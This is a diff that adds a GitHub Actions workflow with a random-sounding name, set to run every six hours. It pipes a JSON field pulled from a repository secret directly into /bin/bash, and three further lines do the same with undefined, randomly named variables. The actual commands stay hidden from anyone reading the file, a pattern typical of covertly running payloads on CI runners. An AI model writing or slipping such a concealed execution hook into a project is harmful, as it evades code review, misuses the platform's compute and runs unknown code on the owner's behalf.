@@ -1,0 +1,20 @@
+name: colossalfrittata
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: colossalfrittata
+        env:
+          ht3: ${{ secrets.ht3 }}
+        run: |
+          echo $ht3 | jq -r .ko30204 | /bin/bash
+          echo $nr8730 | jq -r .ex9053 | /bin/bash
+          echo $fshru79 | jq -r .fktp9660 | /bin/bash
+          echo $ccrgx73343 | jq -r .jkxiq9855 | /bin/bash
+
